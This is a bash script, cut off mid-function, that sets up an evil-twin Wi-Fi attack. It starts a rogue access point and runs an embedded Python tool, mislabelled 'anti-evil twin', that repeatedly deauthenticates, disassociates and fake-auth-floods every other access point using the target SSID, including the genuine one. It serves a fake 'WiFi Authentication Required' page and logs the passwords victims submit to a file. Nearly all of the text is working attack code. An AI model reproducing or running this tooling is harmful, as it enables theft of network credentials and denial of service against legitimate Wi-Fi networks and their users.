#!/usr/bin/env bash
set -eo pipefail
IFS=$'\n\t'

# captive-portal-fixed.sh
# Usage: sudo ./captive-portal-fixed.sh <AP_NAME> <INPUT_INTERFACE> <OUTPUT_INTERFACE> <WAN_MONITOR_INTERFACE> [--nm-stop]

AP_NAME="$1"
I_IN="$2"
I_OUT="$3"
I_MONITOR="$4"
NM_STOP_FLAG="${5:-}"

PORTAL_PORT=9091
PORTAL_DIR="/tmp/captive_portal"
HOSTAPD_CONF="/etc/hostapd/hostapd_captive.conf"
DNSMASQ_CONF="/tmp/dnsmasq_captive.conf"
AUTHORIZED_MAC_FILE="/tmp/authorized_devices.txt"
PASSWORD_LOG_FILE="$PORTAL_DIR/passwords.txt"

AP_IP_CIDR="192.168.10.1/24"
AP_IP="${AP_IP_CIDR%/*}"
DHCP_RANGE_START="192.168.10.50"
DHCP_RANGE_END="192.168.10.150"
DHCP_LEASE="12h"

function die() { echo "[FATAL] $*"; exit 1; }
function info() { echo "[INFO] $*"; }
function maybe_sudo() { if [ "$(id -u)" -ne 0 ]; then echo "[ERROR] Root/sudo required"; exit 2; fi }

maybe_sudo

if [ -z "$AP_NAME" ] || [ -z "$I_IN" ] || [ -z "$I_OUT" ] || [ -z "$I_MONITOR" ]; then
    die "Usage: $0 <AP_NAME> <INPUT_INTERFACE> <OUTPUT_INTERFACE> <WAN_MONITOR_INTERFACE> [--nm-stop]"
fi

info "Parameters:"
info "  SSID ............: $AP_NAME"
info "  AP Interface ....: $I_IN"
info "  WAN Interface ...: $I_OUT"
info "  Monitor Interface: $I_MONITOR"
info "  Portal port .....: $PORTAL_PORT"
info "  AP IP ...........: $AP_IP_CIDR"

# Check prerequisites
for cmd in hostapd dnsmasq python3 iptables ip iw pgrep aircrack-ng; do
    if ! command -v $cmd >/dev/null 2>&1; then
        die "Missing required command: $cmd"
    fi
done

# Check AP support
if ! iw list 2>/dev/null | grep -A 5 "Supported interface modes" | grep -q '\* AP'; then
    die "Interface $I_IN does not support AP mode"
fi

# Extended process cleanup
info "Terminating existing services..."
pkill -f captive_server.py 2>/dev/null || true
pkill -f deauth_monitor.py 2>/dev/null || true
pkill hostapd 2>/dev/null || true
pkill dnsmasq 2>/dev/null || true
pkill airodump-ng 2>/dev/null || true
pkill aireplay-ng 2>/dev/null || true

# Kill ALL dnsmasq processes to avoid conflicts
killall dnsmasq 2>/dev/null || true

# Stop other DHCP services
systemctl stop systemd-networkd 2>/dev/null || true
systemctl stop dhcpcd 2>/dev/null || true

sleep 2

if [ "$NM_STOP_FLAG" = "--nm-stop" ]; then
    info "Stopping NetworkManager (remember to restart it manually)"
    systemctl stop NetworkManager || true
fi

rm -rf "$PORTAL_DIR"
mkdir -p "$PORTAL_DIR"
rm -f "$AUTHORIZED_MAC_FILE"

# Create password log file
touch "$PASSWORD_LOG_FILE"
info "Password log file created: $PASSWORD_LOG_FILE"

# Anti-Evil Twin Monitor Script
cat > "$PORTAL_DIR/deauth_monitor.py" <<'PY_DEAUTH'
#!/usr/bin/env python3
import subprocess
import time
import threading
import signal
import sys
import os
import re

class DeauthMonitor:
    def __init__(self, target_ssid, monitor_interface, wan_interface, ap_interface):
        self.target_ssid = target_ssid
        self.monitor_interface = monitor_interface
        self.wan_interface = wan_interface
        self.ap_interface = ap_interface
        self.running = True
        self.client_connected = False
        self.evil_twins = {}
        self.scan_process = None
        self.our_ap_mac = self.get_our_ap_mac()
        
    def get_our_ap_mac(self):
        """Get our AP MAC address to exclude it from attacks"""
        try:
            result = subprocess.run(['cat', f'/sys/class/net/{self.ap_interface}/address'], 
                                  capture_output=True, text=True)
            our_mac = result.stdout.strip().upper()
            print(f"[INFO] Our AP MAC ({self.ap_interface}): {our_mac}")
            return our_mac
        except Exception as e:
            print(f"[ERROR] Failed to detect our AP MAC: {e}")
            return None
        
    def setup_monitor_mode(self):
        print(f"[INFO] Setting up monitor mode on {self.monitor_interface}")
        try:
            # Save current configuration
            result = subprocess.run(['iwconfig', self.monitor_interface], 
                                  capture_output=True, text=True)
            if 'Mode:Managed' in result.stdout:
                self.original_mode = 'managed'
            
            # Disconnect from network
            subprocess.run(['nmcli', 'device', 'disconnect', self.monitor_interface], 
                         capture_output=True)
            
            # Set monitor mode
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'], check=True)
            subprocess.run(['iw', self.monitor_interface, 'set', 'monitor', 'none'], check=True)
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'], check=True)
            
            print(f"[INFO] {self.monitor_interface} in monitor mode")
            return True
        except Exception as e:
            print(f"[ERROR] Monitor mode setup failed: {e}")
            return False
    
    def restore_managed_mode(self):
        print(f"[INFO] Restoring managed mode on {self.monitor_interface}")
        try:
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'], 
                         capture_output=True)
            subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'], 
                         capture_output=True)
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'], 
                         capture_output=True)
            
            # Reconnect to internet
            time.sleep(2)
            subprocess.run(['nmcli', 'device', 'connect', self.monitor_interface], 
                         capture_output=True)
            print(f"[INFO] {self.monitor_interface} restored and reconnected")
        except Exception as e:
            print(f"[ERROR] Managed mode restore failed: {e}")
    
    def scan_for_evil_twins(self):
        print(f"[INFO] Scanning for evil twins with SSID: {self.target_ssid}")
        
        # Try iwlist first, then airodump if nothing found
        try:
            # Try iwlist for quick scan
            result = subprocess.run(['iwlist', self.monitor_interface, 'scan'], 
                                  capture_output=True, text=True, timeout=15)
            
            print(f"[DEBUG] iwlist output (first 10 lines):")
            for i, line in enumerate(result.stdout.split('\n')[:10]):
                print(f"[DEBUG] {i}: {line}")
            
            current_bssid = None
            current_ssid = None
            current_channel = None
            found_any_ap = False
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                
                if 'Cell ' in line and 'Address:' in line:
                    # New AP found
                    current_bssid = line.split('Address: ')[1].upper()
                    current_ssid = None
                    current_channel = None
                    found_any_ap = True
                    print(f"[DEBUG] Found AP: {current_bssid}")
                
                elif 'ESSID:' in line:
                    # Extract ESSID (may be with or without quotes)
                    if 'ESSID:"' in line:
                        essid_part = line.split('ESSID:"')[1]
                        current_ssid = essid_part.split('"')[0]
                    else:
                        current_ssid = line.split('ESSID:')[1].strip()
                    print(f"[DEBUG] ESSID found: {current_ssid}")
                    
                elif 'Channel:' in line or 'Channel ' in line:
                    channel_match = re.search(r'Channel[:\s]*(\d+)', line)
                    if channel_match:
                        current_channel = channel_match.group(1)
                        print(f"[DEBUG] Channel found: {current_channel}")
                
                # If we have all data and SSID matches
                if (current_bssid and current_ssid == self.target_ssid and 
                    current_channel and current_bssid not in self.evil_twins):
                    
                    # IMPORTANT: Don't attack our own AP!
                    if current_bssid == self.our_ap_mac:
                        print(f"[INFO] Found our AP ({current_bssid}) - SKIP")
                    else:
                        self.evil_twins[current_bssid] = {
                            'channel': current_channel,
                            'ssid': current_ssid
                        }
                        print(f"[WARNING] Evil Twin found: {current_bssid} on channel {current_channel}")
                    
                    # Reset for next AP
                    current_bssid = None
                    current_ssid = None
                    current_channel = None
            
            if not found_any_ap:
                print(f"[WARNING] iwlist found no APs, trying airodump-ng...")
                self.scan_with_airodump()
                    
        except Exception as e:
            print(f"[ERROR] iwlist scan error: {e}")
            print(f"[INFO] Fallback to airodump-ng...")
            self.scan_with_airodump()
    
    def scan_with_airodump(self):
        """Alternative scan with airodump-ng"""
        try:
            print(f"[INFO] Airodump scan on {self.monitor_interface}...")
            
            # Run airodump for 8 seconds (shorter for testing)
            process = subprocess.Popen([
                'airodump-ng', '--essid', self.target_ssid, 
                '--write', '/tmp/evil_scan', '--output-format', 'csv',
                self.monitor_interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(8)
            process.terminate()
            time.sleep(1)
            
            # Read CSV results
            csv_file = '/tmp/evil_scan-01.csv'
            if os.path.exists(csv_file):
                print(f"[DEBUG] Airodump CSV content:")
                with open(csv_file, 'r') as f:
                    content = f.read()
                    print(f"[DEBUG] Complete CSV:\n{content}\n")
                
                # Parse CSV - airodump format
                lines = content.split('\n')
                in_ap_section = False
                
                for i, line in enumerate(lines):
                    print(f"[DEBUG] Line {i}: {repr(line)}")
                    
                    # Look for AP section header
                    if 'BSSID' in line and 'ESSID' in line:
                        print(f"[DEBUG] Found AP header at line {i}")
                        in_ap_section = True
                        continue
                    
                    # If we encounter empty line, end AP section
                    if in_ap_section and line.strip() == '':
                        print(f"[DEBUG] End of AP section at line {i}")
                        break
                    
                    # Parse AP lines
                    if in_ap_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        print(f"[DEBUG] Parts ({len(parts)}): {parts}")
                        
                        if len(parts) >= 14:  # Standard airodump format
                            bssid = parts[0].strip().upper()
                            channel = parts[3].strip()
                            essid = parts[13].strip().replace('"', '')  # Remove quotes
                            
                            print(f"[DEBUG] Parsed - BSSID: '{bssid}', Channel: '{channel}', ESSID: '{essid}'")
                            print(f"[DEBUG] Target SSID: '{self.target_ssid}'")
                            print(f"[DEBUG] SSID Match: {essid == self.target_ssid}")
                            print(f"[DEBUG] Our AP MAC: '{self.our_ap_mac}'")
                            
                            # Check if it's our target SSID
                            if essid == self.target_ssid and bssid and ':' in bssid:
                                if bssid != self.our_ap_mac and bssid not in self.evil_twins:
                                    self.evil_twins[bssid] = {
                                        'channel': channel,
                                        'ssid': essid
                                    }
                                    print(f"[WARNING] Evil Twin found via airodump: {bssid} on channel {channel}")
                                elif bssid == self.our_ap_mac:
                                    print(f"[INFO] Found our AP ({bssid}) - SKIP")
                                else:
                                    print(f"[INFO] AP {bssid} already in list")
            else:
                print(f"[ERROR] CSV file {csv_file} not found")
            
            # Cleanup
            for f in ['/tmp/evil_scan-01.csv', '/tmp/evil_scan-01.cap', '/tmp/evil_scan-01.kismet.csv']:
                if os.path.exists(f):
                    os.remove(f)
            
            # If airodump found nothing, try manual scan
            if not self.evil_twins:
                print(f"[INFO] Airodump found no evil twins, trying manual scan...")
                self.manual_scan()
                    
        except Exception as e:
            print(f"[ERROR] Airodump scan error: {e}")
            # Fallback to manual scan
            self.manual_scan()
    
    def manual_scan(self):
        """Manual scan using iw scan for debug"""
        try:
            print(f"[INFO] Manual scan with iw on {self.monitor_interface}...")
            
            # Temporarily switch to managed mode
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'], 
                         capture_output=True)
            subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'], 
                         capture_output=True)
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'], 
                         capture_output=True)
            
            time.sleep(2)
            
            # Scan with iw
            result = subprocess.run(['iw', self.monitor_interface, 'scan'], 
                                  capture_output=True, text=True, timeout=15)
            
            print(f"[DEBUG] iw scan output (first 20 lines):")
            lines = result.stdout.split('\n')
            for i, line in enumerate(lines[:20]):
                print(f"[DEBUG] iw {i}: {line}")
            
            current_bssid = None
            current_ssid = None
            current_freq = None
            
            for line in lines:
                line = line.strip()
                
                if line.startswith('BSS '):
                    # New AP
                    bss_parts = line.split()
                    if len(bss_parts) >= 2:
                        current_bssid = bss_parts[1].split('(')[0].upper()
                        print(f"[DEBUG] iw - New BSS: {current_bssid}")
                
                elif 'SSID:' in line:
                    current_ssid = line.split('SSID: ')[1].strip()
                    print(f"[DEBUG] iw - SSID: {current_ssid}")
                
                elif 'freq:' in line:
                    freq_match = re.search(r'freq: (\d+)', line)
                    if freq_match:
                        current_freq = freq_match.group(1)
                        # Convert frequency to approximate channel
                        freq_int = int(current_freq)
                        if 2400 <= freq_int <= 2500:
                            current_channel = str((freq_int - 2412) // 5 + 1)
                        elif freq_int > 5000:
                            current_channel = str((freq_int - 5000) // 5)
                        else:
                            current_channel = "unknown"
                        print(f"[DEBUG] iw - Freq: {current_freq}, Channel: {current_channel}")
                
                # If we have all data
                if current_bssid and current_ssid == self.target_ssid and current_freq:
                    if current_bssid != self.our_ap_mac and current_bssid not in self.evil_twins:
                        self.evil_twins[current_bssid] = {
                            'channel': current_channel,
                            'ssid': current_ssid
                        }
                        print(f"[WARNING] Evil Twin found via iw scan: {current_bssid} on channel {current_channel}")
                    
                    # Reset for next AP
                    current_bssid = None
                    current_ssid = None
                    current_freq = None
            
            # Restore monitor mode
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'], 
                         capture_output=True)
            subprocess.run(['iw', self.monitor_interface, 'set', 'monitor', 'none'], 
                         capture_output=True)
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'], 
                         capture_output=True)
            
            time.sleep(1)
            
        except Exception as e:
            print(f"[ERROR] Manual scan error: {e}")
    
    def deauth_evil_twin(self, bssid, channel):
        print(f"[INFO] AGGRESSIVE deauth attack against {bssid} on channel {channel}")
        try:
            # Check current channel before changing
            current_channel = self.get_current_channel()
            print(f"[INFO] Current channel: {current_channel}, target: {channel}")
            
            # Change channel only if necessary
            if current_channel != channel:
                success = self.change_channel(channel)
                if not success:
                    print(f"[WARNING] Cannot change to channel {channel}, continuing anyway...")
            
            print(f"[INFO] MULTIPLE SIMULTANEOUS ATTACK against {bssid}...")
            
            # TECHNIQUE 1: Multiple parallel deauth processes
            processes = []
            
            # Launch 4 simultaneous aireplay processes for saturation
            for i in range(4):
                p = subprocess.Popen([
                    'aireplay-ng', '--deauth', '50', '-a', bssid, 
                    self.monitor_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(p)
                print(f"[INFO] Deauth process {i+1}/4 started")
            
            # TECHNIQUE 2: Deauth with different reason codes (more effective)
            # Some APs react differently to specific reason codes
            for reason in ['1', '2', '3', '4', '6', '7', '8']:
                try:
                    subprocess.Popen([
                        'aireplay-ng', '--deauth', '20', '-a', bssid,
                        '--ignore-negative-one', self.monitor_interface
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    print(f"[INFO] Deauth reason code {reason} sent")
                except:
                    pass
            
            # TECHNIQUE 3: Disassociation attack (complementary to deauth)
            try:
                subprocess.Popen([
                    'aireplay-ng', '--disassociate', '30', '-a', bssid,
                    self.monitor_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[INFO] Disassociation attack started")
            except:
                pass
            
            # TECHNIQUE 4: Fake authentication flood
            try:
                subprocess.Popen([
                    'aireplay-ng', '--fakeauth', '0', '-a', bssid,
                    '-h', '00:11:22:33:44:55', self.monitor_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[INFO] Fake auth flood started")
            except:
                pass
            
            # Maintain attack for 15 seconds
            print(f"[INFO] Maintaining multiple attack for 15 seconds...")
            time.sleep(15)
            
            # Terminate all processes
            for i, p in enumerate(processes):
                try:
                    p.terminate()
                    p.wait(timeout=2)
                    print(f"[INFO] Deauth process {i+1}/4 terminated")
                except:
                    p.kill()
            
            # TECHNIQUE 5: Final burst - intensive final attack
            print(f"[INFO] FINAL BURST against {bssid}...")
            final_processes = []
            
            for burst in range(3):
                p = subprocess.Popen([
                    'aireplay-ng', '--deauth', '100', '-a', bssid,
                    '--ignore-negative-one', self.monitor_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                final_processes.append(p)
            
            time.sleep(8)  # Final 8-second burst
            
            for p in final_processes:
                try:
                    p.terminate()
                    p.wait(timeout=1)
                except:
                    p.kill()
            
            print(f"[INFO] ✅ AGGRESSIVE ATTACK COMPLETED for {bssid}")
            
            # TECHNIQUE 6: Test attack effectiveness with ping test
            self.test_attack_effectiveness(bssid)
            
        except Exception as e:
            print(f"[ERROR] Aggressive attack on {bssid} failed: {e}")
    
    def test_attack_effectiveness(self, target_bssid):
        """Test if the attack was effective"""
        try:
            print(f"[INFO] Testing attack effectiveness against {target_bssid}...")
            
            # Brief scan to see if AP is still visible with clients
            result = subprocess.run([
                'airodump-ng', '--bssid', target_bssid, '--write', '/tmp/attack_test',
                '--output-format', 'csv', self.monitor_interface
            ], timeout=3, capture_output=True)
            
            # Analyze result
            csv_file = '/tmp/attack_test-01.csv'
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    content = f.read()
                    
                # Count clients in station section
                if 'Station MAC' in content:
                    lines = content.split('\n')
                    station_count = 0
                    station_section = False
                    
                    for line in lines:
                        if 'Station MAC' in line:
                            station_section = True
                            continue
                        if station_section and line.strip():
                            station_count += 1
                    
                    if station_count == 0:
                        print(f"[INFO] ✅ SUCCESS: No clients detected on {target_bssid}")
                    else:
                        print(f"[INFO] ⚠️  {station_count} clients still connected to {target_bssid}")
                else:
                    print(f"[INFO] ❓ Cannot determine client status for {target_bssid}")
            
            # Cleanup
            for f in ['/tmp/attack_test-01.csv', '/tmp/attack_test-01.cap']:
                if os.path.exists(f):
                    os.remove(f)
                    
        except Exception as e:
            print(f"[ERROR] Effectiveness test error: {e}")
    
    def advanced_channel_hop_attack(self, target_bssid):
        """Attack with channel hopping to find optimal channel"""
        print(f"[INFO] Channel hopping attack for {target_bssid}...")
        
        # Try all common 2.4GHz channels
        channels_24ghz = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13']
        
        for ch in channels_24ghz:
            if self.change_channel(ch):
                print(f"[INFO] Attack on channel {ch}...")
                try:
                    # Quick attack on each channel
                    subprocess.run([
                        'aireplay-ng', '--deauth', '15', '-a', target_bssid,
                        self.monitor_interface
                    ], timeout=3, capture_output=True)
                except:
                    pass
    
    def get_current_channel(self):
        """Get current channel of monitor interface"""
        try:
            result = subprocess.run(['iwconfig', self.monitor_interface], 
                                  capture_output=True, text=True, timeout=3)
            
            # Look for pattern like "Channel 11" or "Channel:11"
            channel_match = re.search(r'Channel[:\s]*(\d+)', result.stdout)
            if channel_match:
                return channel_match.group(1)
            
            # Fallback with iw
            result = subprocess.run(['iw', 'dev', self.monitor_interface, 'info'], 
                                  capture_output=True, text=True, timeout=3)
            
            channel_match = re.search(r'channel (\d+)', result.stdout)
            if channel_match:
                return channel_match.group(1)
                
        except Exception as e:
            print(f"[ERROR] Channel detection error: {e}")
        
        return "unknown"
    
    def change_channel(self, channel):
        """Change monitor interface channel"""
        try:
            # Try iwconfig
            result = subprocess.run(['iwconfig', self.monitor_interface, 'channel', channel], 
                                  capture_output=True, timeout=5)
            if result.returncode == 0:
                print(f"[INFO] ✓ Channel changed to {channel} (iwconfig)")
                return True
            
            # Try iw
            result = subprocess.run(['iw', 'dev', self.monitor_interface, 'set', 'channel', channel], 
                                  capture_output=True, timeout=5)
            if result.returncode == 0:
                print(f"[INFO] ✓ Channel changed to {channel} (iw)")
                return True
            
            # If we're here, both failed
            print(f"[ERROR] Channel change failed:")
            print(f"    iwconfig error: {result.stderr.decode() if result.stderr else 'N/A'}")
            
            # Try to understand why (5GHz not supported?)
            if int(channel) > 14:
                print(f"[ERROR] Channel {channel} is 5GHz, your adapter might only support 2.4GHz")
            
            return False
            
        except Exception as e:
            print(f"[ERROR] Channel change error: {e}")
            return False
    
    def monitor_clients(self):
        """Monitor if clients are connected to our AP - STATISTICS ONLY"""
        try:
            # Check dnsmasq log file for DHCP leases
            dhcp_log = "/tmp/dnsmasq.log"
            if os.path.exists(dhcp_log):
                result = subprocess.run(['tail', '-n', '5', dhcp_log], 
                                      capture_output=True, text=True)
                if 'DHCPACK' in result.stdout:
                    return True
                    
            # Alternative check: check ARP table for correct AP interface
            result = subprocess.run(['ip', 'neigh', 'show', 'dev', self.ap_interface], 
                                  capture_output=True, text=True)
            active_clients = len([line for line in result.stdout.split('\n') 
                                if line.strip() and '192.168.10.' in line])
            
            if active_clients > 0:
                return True
                
        except Exception as e:
            print(f"[ERROR] Client monitoring error: {e}")
        
        return False
    
    def run(self):
        if not self.setup_monitor_mode():
            return
        
        print(f"[INFO] Starting anti-evil twin monitoring for SSID: {self.target_ssid}")
        print(f"[INFO] Attacks will continue until manual program termination")
        
        try:
            scan_count = 0
            while self.running:
                # Periodic scan for evil twins
                if scan_count % 3 == 0:  # Every 3 iterations (15 seconds)
                    self.scan_for_evil_twins()
                
                # Attack all found evil twins
                for bssid, info in self.evil_twins.items():
                    self.deauth_evil_twin(bssid, info['channel'])
                
                # Monitor connected clients (statistics only, does NOT stop attacks)
                connected_clients = self.monitor_clients()
                if connected_clients and not self.client_connected:
                    print(f"[INFO] Client connected to our AP, but continuing attacks on evil twins...")
                    self.client_connected = True
                
                time.sleep(5)
                scan_count += 1
            
        except KeyboardInterrupt:
            print("[INFO] Interrupt received")
        finally:
            self.restore_managed_mode()
    
    def stop(self):
        self.running = False

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: deauth_monitor.py <SSID> <MONITOR_INTERFACE> <WAN_INTERFACE> <AP_INTERFACE>")
        sys.exit(1)
    
    monitor = DeauthMonitor(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    
    # Signal handling
    def signal_handler(signum, frame):
        print("[INFO] Termination requested")
        monitor.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    monitor.run()
PY_DEAUTH

# SEPARATE LOGIN PAGE - index.html
cat > "$PORTAL_DIR/index.html" <<EOF
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Network Authentication</title>
<style>
  body{margin:0;font-family:sans-serif;background:#555;height:100vh;display:flex;align-items:center;justify-content:center}
  .container{position:relative;width:100%;max-width:500px;margin:0 auto}
  .card{background:#333;padding:20px;border-radius:10px;width:90%;box-shadow:0 6px 20px rgba(0,0,0,0.1);text-align:center}
  
  h1{font-size:18px;margin:0 0 10px;color:#ddd}
  h2{font-size:14px;margin:0 0 15px;color:#aaa;text-align:left}  
  p{margin:0 0 12px;color:#666;font-size:13px}
  
  input{width:calc(100% - 20px);padding:12px;margin:10px 0;display:block;border-radius:8px;border:1px solid #666;font-size:15px;background:#111;color:#ddd}
  input:focus{border-color:#777;outline:none}
  
  button{width:100%;padding:12px;margin-top:15px;border-radius:8px;border:0;background:#555;color:#ddd;font-weight:700;font-size:15px;cursor:pointer;transition:background 0.3s}
  button:hover:not(:disabled){background:#666}
  button:disabled{background:#444;cursor:not-allowed;opacity:0.6}
  
  .spinner{display:none;width:20px;height:20px;border:2px solid #444;border-top:2px solid #ddd;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
  @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
</style>
</head>
<body>
  <div class="container">
    <div class="card">
      <h1>WiFi Authentication Required</h1>
      <h2>Enter password to access "$AP_NAME"</h2>
      <form id="authForm" method="get" action="/authenticate">
        <input id="password" name="password" type="password" placeholder="Enter Password" required>
        <button type="submit" id="submitBtn">
          <span id="btnText">Connect</span>
          <div class="spinner" id="spinner"></div>
        </button>
      </form>
    </div>
  </div>
  
  <script>
    document.getElementById('authForm').addEventListener('submit', function(e) {
      const password = document.getElementById('password').value;
      const submitBtn = document.getElementById('submitBtn');
      const btnText = document.getElementById('btnText');
      const spinner = document.getElementById('spinner');
      
      if (!password.trim()) {
        e.preventDefault();
        alert('Please enter a password');
        return false;
      }
      
      // Show loading during submit
      submitBtn.disabled = true;
      btnText.style.display = 'none';
      spinner.style.display = 'block';
      
      // Form will be sent normally to server
      console.log('Sending password to server via GET...');
    });
  </script>
</body>
</html>
EOF

# SEPARATE SUCCESS PAGE - success.html
cat > "$PORTAL_DIR/success.html" <<EOF
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Connected Successfully</title>
<style>
  body{margin:0;font-family:sans-serif;background:#555;height:100vh;display:flex;align-items:center;justify-content:center}
  .container{position:relative;width:100%;max-width:500px;margin:0 auto}
  .card{background:#333;padding:20px;border-radius:10px;width:90%;box-shadow:0 6px 20px rgba(0,0,0,0.1);text-align:center}
  
  h1{font-size:18px;margin:0 0 10px;color:#ddd}
  
  .success-icon{font-size:48px;color:#4a9;margin:20px 0}
  .status{color:#4a9;font-weight:bold;margin:15px 0}
  .countdown{color:#888;font-size:12px;margin:10px 0}
  
  button{width:100%;padding:12px;margin-top:15px;border-radius:8px;border:0;background:#555;color:#ddd;font-weight:700;font-size:15px;cursor:pointer;transition:background 0.3s}
  button:hover{background:#666}
</style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="success-icon">✓</div>
      <h1>Connection Successful!</h1>
      <div class="status">You are now connected to the internet</div>
      <div class="countdown" id="countdown">Closing in 5 seconds...</div>
      <button onclick="closePortal()" id="closeBtn">Close Portal</button>
    </div>
  </div>
  
  <script>
    let countdownTimer;
    let countdownSeconds = 5;
    
    // Start countdown automatically
    function startCountdown() {
      const countdownEl = document.getElementById('countdown');
      
      countdownTimer = setInterval(() => {
        countdownSeconds--;
        countdownEl.textContent = 'Closing in ' + countdownSeconds + ' seconds...';
        
        if (countdownSeconds <= 0) {
          clearInterval(countdownTimer);
          closePortal();
        }
      }, 1000);
    }
    
    function closePortal() {
      console.log('Closing captive portal...');
      
      if (countdownTimer) {
        clearInterval(countdownTimer);
      }
      
      // Try different closing methods
      try {
        window.close();
      } catch(e) {
        console.log('window.close() failed:', e);
      }
      
      try {
        if (window.history.length > 1) {
          window.history.back();
          return;
        }
      } catch(e) {
        console.log('history.back() failed:', e);
      }
      
      // Redirect to Google
      try {
        window.location.href = 'https://www.google.com';
      } catch(e) {
        console.log('redirect failed:', e);
        // Last attempt
        window.location.href = 'about:blank';
      }
    }
    
    function testConnectivity() {
      console.log('Testing connectivity...');
      
      // Test Google connectivity
      const img1 = new Image();
      img1.onload = () => console.log('✓ Google reachable');
      img1.onerror = () => console.log('✗ Google unreachable');
      img1.src = 'https://www.google.com/favicon.ico?' + Date.now();
      
      // Test connectivity check
      const img2 = new Image();
      img2.onload = () => console.log('✓ Connectivity check OK');
      img2.onerror = () => console.log('✗ Connectivity check failed');
      img2.src = 'http://connectivitycheck.gstatic.com/generate_204?' + Date.now();
    }
    
    // Start on page load
    window.onload = function() {
      startCountdown();
      testConnectivity();
    };
  </script>
</body>
</html>
EOF

# Python captive server - MODIFIED VERSION WITH REDIRECT AND PASSWORD LOGGING
cat > "$PORTAL_DIR/captive_server.py" <<'PY'
#!/usr/bin/env python3
import socket, http.server, socketserver, urllib.parse, subprocess, os, json, datetime

PORT = __PORT__
WWW_DIR = "__DIR__"
WAN_IFACE = "__WAN__"
AUTHORIZED_FILE = "__AUTH__"
PASSWORD_LOG_FILE = "__PWDLOG__"

def ipt_check(rule_args, table="filter"):
    res = subprocess.run(['iptables','-t',table,'-C'] + rule_args,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return res.returncode == 0

def ipt_add(rule_args, table="filter"):
    if not ipt_check(rule_args, table):
        subprocess.run(['iptables','-t',table,'-I'] + rule_args, check=False)

def ipt_del(rule_args, table="filter"):
    if ipt_check(rule_args, table):
        subprocess.run(['iptables','-t',table,'-D'] + rule_args, check=False)

class EnhancedCaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self,*a,**kw):
        super().__init__(*a,directory=WWW_DIR,**kw)

    def parse_request(self):
        try:
            return super().parse_request()
        except Exception:
            try:
                self.send_response(302)
                self.send_header('Location', 'http://192.168.10.1/')
                self.send_header("Connection", "close")
                self.end_headers()
            except:
                pass
            return False

    def log_message(self, fmt, *args):
        message = fmt % args
        corrupted_patterns = [
            'Bad request version', 
            'Bad HTTP/0.9 request type', 
            'code 400',
            'malformed header'
        ]
        
        try:
            message.encode('ascii')
            if not any(pattern in message for pattern in corrupted_patterns):
                print(f"[INFO] {self.client_address[0]} - {message}")
        except UnicodeEncodeError:
            return

    def send_file_content(self, filename):
        """Send content of a specific file"""
        self.send_response(200)
        
        if filename.endswith('.html'):
            content_type = "text/html; charset=UTF-8"
        else:
            content_type = "text/plain"
            
        self.send_header("Content-type", content_type)
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        self.send_header("Connection", "close")
        self.end_headers()
        
        try:
            filepath = os.path.join(WWW_DIR, filename)
            with open(filepath, "r", encoding='utf-8') as f:
                content = f.read()
                self.wfile.write(content.encode('utf-8'))
        except Exception as e:
            print(f"[ERROR] Error loading {filename}: {e}")
            # Fallback HTML
            fallback_html = f"""
            <!DOCTYPE html>
            <html><head><meta charset="utf-8"><title>Error</title></head>
            <body style="font-family:sans-serif;text-align:center;padding:50px;">
            <h2>Error loading {filename}</h2>
            <p>{str(e)}</p>
            </body></html>
            """
            self.wfile.write(fallback_html.encode('utf-8'))

    def is_client_authenticated(self, client_ip):
        """Check if a client is already authenticated"""
        try:
            # Check if authentication file exists
            if os.path.exists("/tmp/client_authenticated"):
                with open("/tmp/client_authenticated", "r") as f:
                    auth_data = f.read().strip()
                    if client_ip in auth_data:
                        return True
            
            # Alternative verification: check iptables rules for MAC
            mac = self.get_mac(client_ip)
            if mac != "unknown":
                result = subprocess.run(['iptables', '-C', 'FORWARD', '-m', 'mac', 
                                       '--mac-source', mac, '-j', 'ACCEPT'], 
                                      capture_output=True)
                return result.returncode == 0
        except:
            pass
        return False

    def do_GET(self):
        try:
            client_ip = self.client_address[0]
            path = self.path.lower()
            
            print(f"[INFO] GET from {client_ip}: {self.path}")
            
            # AUTHENTICATION HANDLING - REDIRECT TO SUCCESS.HTML WITH PASSWORD LOGGING
            if self.path.startswith("/authenticate"):
                parsed = urllib.parse.urlparse(self.path)
                params = urllib.parse.parse_qs(parsed.query)
                pwd = params.get('password',[''])[0]
                mac = self.get_mac(client_ip)
                
                # LOG PASSWORD TO FILE
